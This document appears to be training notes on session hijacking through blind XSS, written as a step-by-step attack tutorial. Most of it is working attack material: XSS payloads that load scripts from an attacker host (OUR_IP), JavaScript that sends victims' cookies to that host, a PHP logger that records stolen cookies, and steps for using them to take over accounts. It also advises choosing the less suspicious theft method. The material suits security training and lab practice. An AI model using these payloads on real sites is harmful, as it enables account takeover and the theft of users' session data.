# Session Hijacking

## Overview

Modern web applications use cookies to maintain user sessions. However, if a malicious user obtains a victim's cookie, they can gain logged-in access without knowing credentials. Using XSS vulnerabilities, attackers can execute JavaScript to collect cookies and hijack sessions.

## Blind XSS Detection

### What is Blind XSS?

A Blind XSS vulnerability occurs when the vulnerability is triggered on a page inaccessible to the attacker. Common locations include:

- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent headers

### Testing Approach

When submitting a form that requires admin review, we cannot see how our input is handled. To detect XSS in such cases, we can use JavaScript payloads that send HTTP requests back to our server.

**Two key challenges:**
1. Identifying which field is vulnerable
2. Determining which XSS payload works

### Loading Remote Scripts

Instead of inline JavaScript, we can load remote scripts and use the URL to identify vulnerable fields:

```html
<script src="http://OUR_IP/fieldname"></script>
```

If we receive a request for `/username`, the username field is vulnerable.

### Payload Examples

```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

### Setting Up a Listener

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

### Testing Payloads

Test each payload with field identifiers:
```html
<script src=http://OUR_IP/fullname></script>
<script src=http://OUR_IP/username></script>
```

**Note:** Skip email (usually validated) and password (typically hashed) fields.

## Session Hijacking Attack

### Cookie Stealing Payloads

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

Use the second option as it's less suspicious.

### Remote Script (script.js)

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

Update the XSS payload:
```html
<script src=http://OUR_IP/script.js></script>
```

### Cookie Logger (index.php)

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

### Expected Output

```
10.10.10.10:52798 [200]: /script.js
10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```

Cookies saved in `cookies.txt`:
```
Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
```

### Using Stolen Cookies

1. Navigate to `/hijacking/login.php`
2. Press `Shift+F9` to open Storage in Firefox Developer Tools
3. Click the `+` button and add the cookie
4. Refresh the page to access the victim's account
